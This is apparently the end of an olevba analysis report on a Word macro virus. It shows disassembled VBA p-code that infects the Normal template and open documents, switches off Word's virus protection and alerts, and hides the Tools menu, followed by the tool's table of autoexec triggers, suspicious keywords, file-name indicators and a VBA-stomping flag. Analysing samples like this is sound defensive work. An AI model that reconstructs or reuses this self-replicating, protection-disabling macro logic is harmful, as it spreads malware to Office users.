' 	ArgsLd GetAttr 0x0001 
' 	St at 
' Line #525:
' 	Ld at 
' 	LitDI2 0x0021 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St at 
' 	EndIf 
' Line #526:
' 	Ld at 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo gghh 
' 	EndIf 
' Line #527:
' 	CloseAll 
' Line #528:
' 	LitStr 0x0009 "c:\vn.dll"
' 	ArgsLd Dir 0x0001 
' 	St dd 
' Line #529:
' 	Ld dd 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo tz2a 
' 	EndIf 
' Line #530:
' 	LitStr 0x0009 "C:\vn.dll"
' 	ArgsCall Kill 0x0001 
' Line #531:
' 	Label tz2a 
' Line #532:
' 	LitStr 0x0009 "c:\vd.dll"
' 	ArgsLd Dir 0x0001 
' 	St dd 
' Line #533:
' 	Ld dd 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo tz2b 
' 	EndIf 
' Line #534:
' 	LitStr 0x0009 "C:\vd.dll"
' 	ArgsCall Kill 0x0001 
' Line #535:
' 	Label tz2b 
' Line #536:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	IfBlock 
' Line #537:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #538:
' 	EndIfBlock 
' Line #539:
' 	Ld windir 
' 	LitStr 0x000F "\system\Log.drv"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #540:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	St lll 
' Line #541:
' 	QuoteRem 0x0000 0x001E "IIS for NormalTemplate Create:"
' Line #542:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St dd 
' Line #543:
' 	Ld dd 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #544:
' 	LitVarSpecial (False)
' 	St aAutoOpen 
' Line #545:
' 	StartForVariable 
' 	Ld Ii 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #546:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld Ii 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St a 
' Line #547:
' 	Ld a 
' 	LitStr 0x0009 "Sub IIS()"
' 	Eq 
' 	IfBlock 
' Line #548:
' 	Ld Ii 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St cl 
' Line #549:
' 	LitDI2 0x0001 
' 	Ld cl 
' 	Ld Ii 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #550:
' 	LitVarSpecial (True)
' 	St aAutoOpen 
' Line #551:
' 	ExitFor 
' Line #552:
' 	EndIfBlock 
' Line #553:
' 	StartForVariable 
' 	Ld Ii 
' 	EndForVariable 
' 	NextVar 
' Line #554:
' 	LitDI2 0x0000 
' 	St Ii 
' Line #555:
' 	Ld aAutoOpen 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #556:
' 	CloseAll 
' Line #557:
' 	LitStr 0x000D "c:\newvnb.dll"
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #558:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	PrintItemSemi 
' 	Ld XXXXX 
' 	PrintItemSemi 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #559:
' 	CloseAll 
' Line #560:
' 	LitStr 0x000D "c:\newvnb.dll"
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #561:
' 	LitStr 0x000D "c:\newvnb.dll"
' 	ArgsCall Kill 0x0001 
' Line #562:
' 	EndIfBlock 
' Line #563:
' 	LitDI2 0x0000 
' 	St iii 
' Line #564:
' 	StartForVariable 
' 	Ld iii 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #565:
' 	Ld iii 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St cl 
' Line #566:
' 	Ld cl 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #567:
' 	StartForVariable 
' 	Ld iii 
' 	EndForVariable 
' 	NextVar 
' Line #568:
' 	LitStr 0x0009 "Sub IIS()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St AutoOpenCode 
' Line #569:
' 	Ld AutoOpenCode 
' 	LitStr 0x0012 "'Macro created by "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St AutoOpenCode 
' Line #570:
' 	Ld AutoOpenCode 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St AutoOpenCode 
' Line #571:
' 	LitDI2 0x0001 
' 	Ld AutoOpenCode 
' 	Ld iii 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #572:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #573:
' 	QuoteRem 0x0000 0x001E "IIS for ActiveDocument Create:"
' Line #574:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x0001 "a"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo nomacro 
' 	EndIf 
' Line #575:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	St at 
' Line #576:
' 	Ld at 
' 	LitDI2 0x0021 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St at 
' 	EndIf 
' Line #577:
' 	Ld at 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo nomacro 
' 	EndIf 
' Line #578:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	IfBlock 
' Line #579:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St dd 
' Line #580:
' 	Ld dd 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #581:
' 	LitVarSpecial (False)
' 	St aAutoOpen 
' Line #582:
' 	StartForVariable 
' 	Ld Ii 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #583:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld Ii 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St a 
' Line #584:
' 	Ld a 
' 	LitStr 0x0009 "Sub IIS()"
' 	Eq 
' 	IfBlock 
' Line #585:
' 	Ld Ii 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St cl 
' Line #586:
' 	LitDI2 0x0001 
' 	Ld cl 
' 	Ld Ii 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #587:
' 	LitVarSpecial (True)
' 	St aAutoOpen 
' Line #588:
' 	ExitFor 
' Line #589:
' 	EndIfBlock 
' Line #590:
' 	StartForVariable 
' 	Ld Ii 
' 	EndForVariable 
' 	NextVar 
' Line #591:
' 	LitDI2 0x0000 
' 	St Ii 
' Line #592:
' 	Ld aAutoOpen 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #593:
' 	CloseAll 
' Line #594:
' 	LitStr 0x000D "c:\newvnb.dll"
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #595:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	PrintItemSemi 
' 	Ld XXXXX 
' 	PrintItemSemi 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #596:
' 	CloseAll 
' Line #597:
' 	LitStr 0x000D "c:\newvnb.dll"
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #598:
' 	LitStr 0x000D "c:\newvnb.dll"
' 	ArgsCall Kill 0x0001 
' Line #599:
' 	EndIfBlock 
' Line #600:
' 	LitDI2 0x0000 
' 	St iii 
' Line #601:
' 	StartForVariable 
' 	Ld iii 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #602:
' 	Ld iii 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St cl 
' Line #603:
' 	Ld cl 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #604:
' 	StartForVariable 
' 	Ld iii 
' 	EndForVariable 
' 	NextVar 
' Line #605:
' 	LitStr 0x0009 "Sub IIS()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St AutoOpenCode 
' Line #606:
' 	Ld AutoOpenCode 
' 	LitStr 0x0012 "'Macro created by "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St AutoOpenCode 
' Line #607:
' 	Ld AutoOpenCode 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St AutoOpenCode 
' Line #608:
' 	LitDI2 0x0001 
' 	Ld AutoOpenCode 
' 	Ld iii 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #609:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #610:
' 	EndIfBlock 
' Line #611:
' 	Label nomacro 
' Line #612:
' Line #613:
' 	CloseAll 
' Line #614:
' 	Label MegaJump 
' Line #615:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St dd 
' Line #616:
' 	Ld dd 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo gghh 
' 	EndIf 
' Line #617:
' 	OnError (Resume Next) 
' Line #618:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbReadOnly 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo gghh 
' 	EndIf 
' Line #619:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	St at 
' Line #620:
' 	Ld at 
' 	LitDI2 0x0021 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St at 
' 	EndIf 
' Line #621:
' 	Ld at 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo gghh 
' 	EndIf 
' Line #622:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #623:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #624:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #625:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #626:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #627:
' 	LitVarSpecial (False)
' 	LitDI2 0x0003 
' 	LitDI2 0x000C 
' 	LitStr 0x0005 "Tools"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #628:
' Line #629:
' 	QuoteRem 0x0000 0x0020 "Insert destruction routine here:"
' Line #630:
' Line #631:
' 	Label gghh 
' Line #632:
' 	Rem 0x0013 " Written by Flitnic"
' Line #633:
' 	EndSub 
' Macros/VBA/Module1 - 883 bytes
' Line #0:
' 	FuncDefn (Sub IIS())
' Line #1:
' 	QuoteRem 0x0000 0x0019 "Macro created by Harry H."
' Line #2:
' 	EndSub 
' Line #3:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |newDocument         |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |vn.dll              |Executable file name                         |
|IOC       |vd.dll              |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |Vd.dll              |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |newvnb.dll          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

